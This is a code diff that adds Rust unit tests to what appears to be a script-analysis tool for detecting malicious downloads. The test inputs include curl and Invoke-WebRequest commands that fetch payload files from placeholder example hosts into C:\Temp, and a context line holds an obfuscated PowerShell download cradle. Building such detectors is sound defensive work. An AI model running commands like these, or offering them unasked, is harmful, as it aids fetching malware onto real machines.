@@ -6722,6 +6722,32 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_url_flag_separated_records_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --url https://curl-separated-url.example/payload.bin -o C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-separated-url.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_short_o_glued_records_destination() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -8499,6 +8525,25 @@ mod ps1_url_extraction_tests {
         assert!(
             has,
             "IWR -Out destination before -Uri was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn iwr_colon_bound_uri_and_outfile_preserve_destination() {
+        let ps = r#"Invoke-WebRequest -Uri:https://iwr-colon.example/payload.exe -OutF:C:\Temp\colon.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-colon.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\colon.exe")
+            )
+        });
+        assert!(
+            has,
+            "IWR colon-bound Uri/OutFile was not preserved: {:?}",
             report.traits
         );
     }
@@ -13775,6 +13820,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "curl --output= destination not recovered cleanly: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_url_flag_separated_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --url https://curl-separated-url-deob.example/payload.bin -o C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-separated-url-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl --url VALUE source not recovered: {:?}",
             env.traits
         );
     }
